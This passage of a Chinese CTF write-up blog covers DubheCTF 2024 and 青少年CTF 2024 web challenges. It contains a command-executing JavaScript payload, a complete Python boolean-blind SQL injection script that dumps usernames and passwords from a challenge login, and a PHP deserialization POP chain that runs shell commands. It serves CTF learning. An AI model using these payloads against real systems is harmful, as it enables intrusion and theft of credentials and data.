script:获取对应的文件名，读取后ctx.eval行<br>所以我们在vps上开启监听<br><a href="http://1.95.13.243:37193/sub?target=clash&url=script:cache/b1bb99f69b2ff9a8407766e11b8b8550,1&token=189069462103782304169366230">http://1.95.13.243:37193/sub?target=clash&url=script:cache/b1bb99f69b2ff9a8407766e11b8b8550,1&token=189069462103782304169366230</a><br>失败了……不知道哪有问题<br>多亏这篇文章对于fix的讲述<br><a href="https://gist.github.com/CwithW/01a726e5af709655d6ee0b2067cdae03">https://gist.github.com/CwithW/01a726e5af709655d6ee0b2067cdae03</a><br>最后的最后，不需要反弹shell，改一下payload：</p><p>| JavaScriptfunction parse(x){<br>    os.exec([“sh”,”-c”,”cat &#x2F;* &gt; cache&#x2F;flag”])</p><table><thead><tr><th>}</th></tr></thead></table><p>按照原来的方式把文件写在本地上，然后执行文件，最后到&#x2F;render路由拿flag：<br><img src="/img/DubheCTF_2024/10.png"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>青少年ctf 2024</title>
    <link href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/"/>
    <url>/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="Easy-md5"><a href="#Easy-md5" class="headerlink" title="Easy md5"></a>Easy md5</h1><p>需要我们上传两个md5相同的PDF文件。</p><p>新建一个空白PDF文件，拖到fastcoll里得到另外两个pdf文件，上传进去得到flag。</p><h1 id="php的后门"><a href="#php的后门" class="headerlink" title="php的后门"></a>php的后门</h1><p>是php 8.1dev版本漏洞</p><p><a href="https://cloud.tencent.com/developer/article/1839234">https://cloud.tencent.com/developer/article/1839234</a></p><p><img src="/img/%E9%9D%92%E5%B0%91%E5%B9%B4CTF2024/1.png" alt="图片.png"></p><h1 id="PHP的XXE"><a href="#PHP的XXE" class="headerlink" title="PHP的XXE"></a>PHP的XXE</h1><p><a href="https://github.com/vulhub/vulhub/blob/master/php/php_xxe/README.md">https://github.com/vulhub/vulhub/blob/master/php/php_xxe/README.md</a></p><p><img src="/img/%E9%9D%92%E5%B0%91%E5%B9%B4CTF2024/2.jpg" alt="图片.jpg"></p><p><img src="/img/%E9%9D%92%E5%B0%91%E5%B9%B4CTF2024/3.jpg" alt="图片.jpg"></p><p>直接照搬poc</p><h1 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h1><p>直接布尔盲注脚本一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_str</span>():  <span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-comment">#print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-keyword">return</span> str_list  <span class="hljs-comment"># 返回字符列表</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_length</span>(<span class="hljs-params">url, <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]开始测试数据库名长度.......&quot;</span>)<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        db_payload = &#123;<br>            <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and length(database()) like <span class="hljs-subst">&#123;num&#125;</span>#&quot;</span>,<br>            <span class="hljs-string">&#x27;psw&#x27;</span> : <span class="hljs-number">123456</span><br>        &#125;<br>        r = requests.post(url=url,data=db_payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>            db_length = num<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]数据库长度：%d\n&quot;</span> % db_length)<br>            db_name(db_length)  <span class="hljs-comment"># 进行下一步，测试库名</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name</span>(<span class="hljs-params">db_length</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]开始测试数据库名.......&quot;</span>)<br>    db_name = <span class="hljs-string">&#x27;&#x27;</span><br>    str_list = ascii_str()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, db_length + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str_list:<br>            db_payload = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and (ord(mid(database(),<span class="hljs-subst">&#123;i&#125;</span>,1)) like <span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>)#&quot;</span>,<br>                <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>            &#125;r = requests.post(url=url, data=db_payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                db_name += j<br>                <span class="hljs-built_in">print</span>(db_name)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]数据库名：%s\n&quot;</span> % db_name)<br>    tb_piece(db_name)  <span class="hljs-comment"># 进行下一步，测试security数据库有几张表</span><br>    <span class="hljs-keyword">return</span> db_name<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tb_piece</span>(<span class="hljs-params">db_name</span>):<br>    <span class="hljs-keyword">global</span> tb_piece<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始测试%s数据库有几张表........&quot;</span> % db_name)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):  <span class="hljs-comment"># 猜解库中有多少张表，合理范围即可</span><br>        tb_payload = &#123;<br>            <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and <span class="hljs-subst">&#123;i&#125;</span> like (Select Count(Table_name) From Information_schema.tables Where table_schema like &#x27;<span class="hljs-subst">&#123;db_name&#125;</span>&#x27;)#&quot;</span>,<br>            <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>        &#125;<br>        r = requests.post(url=url, data=tb_payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>            tb_piece = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;db_name&#125;</span>库一共有<span class="hljs-subst">&#123;tb_piece&#125;</span>张表\n&quot;</span>)<br>    tb_name(db_name, tb_piece)  <span class="hljs-comment"># 进行下一步，猜解表名</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tb_name</span>(<span class="hljs-params">db_name, tb_piece</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]开始猜解表名.......&quot;</span>)<br>    table_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tb_piece):<br>        str_list = ascii_str()<br>        tb_length = <span class="hljs-number">0</span><br>        tb_name = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):  <span class="hljs-comment"># 表名长度，合理范围即可</span><br>            tb_payload = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and (Select length(table_name) from Information_schema.tables Where table_schema like database() limit <span class="hljs-subst">&#123;i&#125;</span>,1) like <span class="hljs-subst">&#123;j&#125;</span>#&quot;</span>,<br>                <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>            &#125;<br>            r = requests.post(url=url, data=tb_payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                tb_length = j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d张表名长度：%s&quot;</span> % (i + <span class="hljs-number">1</span>, tb_length))<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tb_length + <span class="hljs-number">1</span>):  <span class="hljs-comment"># 根据表名长度进行截取对比</span><br>                    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> str_list:<br>                        tb_payload = &#123;<br>                            <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and (Select ord(mid((Select table_name from Information_schema.tables Where table_schema like database() limit <span class="hljs-subst">&#123;i&#125;</span>,1),<span class="hljs-subst">&#123;k&#125;</span>,1))) like <span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(l)&#125;</span>#&quot;</span>,<br>                            <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>                        &#125;<br>                        r = requests.post(url=url, data=tb_payload)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                            tb_name += l<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]：%s&quot;</span> % tb_name)<br>                table_list.append(tb_name)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+]%s库下的%s张表：%s\n&quot;</span> % (db_name, tb_piece, table_list))<br>    column_num(table_list, db_name)  <span class="hljs-comment"># 进行下一步，猜解每张表的字段数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">column_num</span>(<span class="hljs-params">table_list, db_name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]开始猜解每张表的字段数：.......&quot;</span>)<br>    column_num_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table_list:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):  <span class="hljs-comment"># 每张表的字段数量，合理范围即可</span><br>            column_payload = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and <span class="hljs-subst">&#123;j&#125;</span> like (Select count(column_name) from Information_schema.columns Where table_name like &#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;)#&quot;</span>,<br>                <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>            &#125;<br>            r = requests.post(url=url, data=column_payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                column_num = j<br>                column_num_list.append(column_num)  <span class="hljs-comment"># 把所有表的字段，依次放入这个列表当中</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]%s表\t%s个字段&quot;</span> % (i, column_num))<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+]表对应的字段数：%s\n&quot;</span> % column_num_list)<br>    column_name(table_list, column_num_list)  <span class="hljs-comment"># 进行下一步，猜解每张表的字段名</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">column_name</span>(<span class="hljs-params">table_list, column_num_list</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]开始猜解每张表的字段名.......&quot;</span>)<br>    column_length = []<br>    str_list = ascii_str()<br>    column_name_list = []<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(table_list)):  <span class="hljs-comment"># t在这里代表每张表的列表索引位置</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+]%s表的字段：&quot;</span> % table_list[t])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(column_num_list[t]):  <span class="hljs-comment"># i表示每张表的字段数量</span><br>            column_name = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">21</span>):  <span class="hljs-comment"># j表示每个字段的长度</span><br>                column_payload = &#123;<br>                    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and <span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span> like (Select length(column_name) from Information_schema.columns Where table_name like &#x27;<span class="hljs-subst">&#123;table_list[t]&#125;</span>&#x27; limit <span class="hljs-subst">&#123;i&#125;</span>,1)#&quot;</span>,<br>                    <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>                &#125;<br>                r = requests.post(url=url, data=column_payload)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                    column_length.append(j)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> str_list:  <span class="hljs-comment"># k表示我们猜解的字符字典</span><br>                    column_payload = &#123;<br>                        <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and ord(mid((Select column_name from Information_schema.columns Where table_name like &#x27;<span class="hljs-subst">&#123;table_list[t]&#125;</span>&#x27; limit <span class="hljs-subst">&#123;i&#125;</span>,1),<span class="hljs-subst">&#123;j&#125;</span>,1)) like <span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(k)&#125;</span>#&quot;</span>,<br>                        <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>                    &#125;<br>                    r = requests.post(url=url, data=column_payload)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                        column_name += k<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]：%s&#x27;</span> % column_name)<br>            column_name_list.append(column_name)<br>    <span class="hljs-comment">#print(column_name_list)#输出所有表中的字段名到一个列表中</span><br>    dump_data(table_list, column_name_list,)  <span class="hljs-comment"># 进行最后一步，输出指定字段的数据</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump_data</span>(<span class="hljs-params">table_list,column_name_list</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):  <span class="hljs-comment"># l表示每条数据的长度，合理范围即可</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>            data_payload = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span> + <span class="hljs-string">f&quot;&#x27; and Ascii(Substr((Select <span class="hljs-subst">&#123;column_name_list[<span class="hljs-number">5</span>]&#125;</span> from <span class="hljs-subst">&#123;table_list[<span class="hljs-number">0</span>]&#125;</span> limit 0,1),<span class="hljs-subst">&#123;l&#125;</span>,1)) like <span class="hljs-subst">&#123;k&#125;</span>#&quot;</span>,<br>                <span class="hljs-string">&#x27;psw&#x27;</span>: <span class="hljs-number">123456</span><br>            &#125;<br>            r = requests.post(url=url, data=data_payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> r.text:<br>                character = <span class="hljs-built_in">chr</span>(k)<br>                <span class="hljs-built_in">print</span>(character,end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://challenge.qsnctf.com:31695/login.php&quot;</span>  <span class="hljs-comment"># 目标url</span><br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;successful&quot;</span>  <span class="hljs-comment"># 布尔型盲注的true&amp;false的判断因素</span><br>    table_list=[<span class="hljs-string">&#x27;users&#x27;</span>]<br>    column_name_list=[<span class="hljs-string">&#x27;USER&#x27;</span>,<span class="hljs-string">&#x27;CURRENT_CONNECTIONS&#x27;</span>,<span class="hljs-string">&#x27;TOTAL_CONNECTIONS&#x27;</span>,<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;password&#x27;</span>]<br>    dump_data(table_list,column_name_list)<br></code></pre></td></tr></table></figure><h1 id="雏形系统"><a href="#雏形系统" class="headerlink" title="雏形系统"></a>雏形系统</h1><p>扫后台有个<a href="http://www.zip,备份文件/">www.zip，备份文件</a> qsnctf里有这么一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是php混淆解密，拿到在线工具上解密出来是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shi</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$next</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;next::<span class="hljs-title function_ invoke__">PLZ</span>(<span class="hljs-variable">$this</span>-&gt;pass);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wo</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$intention</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hi Try serialize Me!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">inspect</span>();<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inspect</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;sex==<span class="hljs-string">&#x27;boy&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;age==<span class="hljs-string">&#x27;eighteen&#x27;</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;intention;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;🙅18岁🈲&quot;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>, <span class="hljs-variable">$do</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$b</span>(<span class="hljs-variable">$do</span>[<span class="hljs-number">0</span>]);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==================PLZ Input Your Name!==================&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable">$b</span>==<span class="hljs-string">&quot;&#x27;k1fuhu&#x27;s test demo&quot;</span>)&#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>  ｝<br>  ｝<br></code></pre></td></tr></table></figure><p>这才进入正题</p><p>最后的出口一定是在 $b($do[0]); 这个方法从全局变量 $b 获取一个函数，并用 $do[0] 作为参数调用这个函数。进入 __callStatic 魔术方法，需要静态调用类中不存在的方法。</p><p>而 shi 类中将 $this-&gt;next 替换为对象demo，即可触发，那么需要进入 __tostring 这个就很熟悉了</p><p>pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shi</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$next</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wo</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>=<span class="hljs-string">&#x27;boy&#x27;</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">&#x27;eighteen&#x27;</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$intention</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> wo;<br><span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> shi;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">demo</span>();<br><span class="hljs-variable">$s</span>-&gt;next=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$w</span>-&gt;intention=<span class="hljs-variable">$s</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的$do则为 cat &#x2F;flag 